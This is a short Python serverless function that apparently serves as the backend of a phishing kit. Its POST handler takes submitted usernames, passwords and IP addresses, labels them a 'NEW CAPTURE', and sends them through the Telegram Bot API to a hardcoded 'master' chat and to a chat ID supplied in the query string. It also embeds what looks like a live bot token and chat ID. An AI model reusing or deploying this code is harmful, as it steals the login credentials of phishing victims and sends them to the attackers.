import json
import requests

BOT_TOKEN = "8806568645:AAFNjN-ViTsqQmSRc9G-Qpx0mq5qiXzHmKk"
MASTER_CHAT_ID = "1007541797"

def handler(event, context):
    method = event.get("httpMethod", "GET")
    
    if method == "GET":
        return {
            "statusCode": 200,
            "body": json.dumps({"status": "ok", "message": "API is working!"}),
            "headers": {"Content-Type": "application/json", "Access-Control-Allow-Origin": "*"}
        }
    
    if method == "POST":
        body = json.loads(event.get("body", "{}"))
        params = event.get("queryStringParameters") or {}
        uid = params.get("uid", "")
        username = body.get("username", "N/A")
        password = body.get("password", "N/A")
        ip = body.get("ip", "N/A")
        
        msg = f"🎯 NEW CAPTURE!\n👤 {username}\n🔑 {password}\n📍 {ip}\n🆔 UID: {uid}"
        
        # Master ko bhejo
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
            json={"chat_id": MASTER_CHAT_ID, "text": msg, "parse_mode": "HTML"}, timeout=10)
        
        # User ko bhi bhejo
        if uid:
            try:
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                    json={"chat_id": int(uid), "text": f"✅ Capture!\n👤 {username}\n🔑 {password}", "parse_mode": "HTML"}, timeout=10)
            except:
                pass
        
        return {
            "statusCode": 200,
            "body": json.dumps({"status": "ok"}),
            "headers": {"Content-Type": "application/json", "Access-Control-Allow-Origin": "*"}
        }
    
    return {"statusCode": 405, "body": json.dumps({"error": "Method not allowed"})}
